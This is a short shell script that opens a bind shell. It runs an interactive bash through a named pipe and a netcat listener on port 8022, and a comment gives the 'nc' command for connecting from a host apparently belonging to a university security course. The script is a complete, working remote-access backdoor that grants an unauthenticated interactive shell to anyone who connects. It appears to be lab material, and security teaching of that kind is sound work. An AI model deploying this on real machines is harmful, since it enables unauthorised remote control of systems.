#!/bin/sh

# Opens a TCP listener on port 8022.
# Connect to it using 'nc secu39.itu.dk 8022' to access the shell

trap "rm -f ~/shell" EXIT

mkfifo ~/shell
cat ~/shell | bash -i 2>&1 | nc -l 8022 > ~/shell
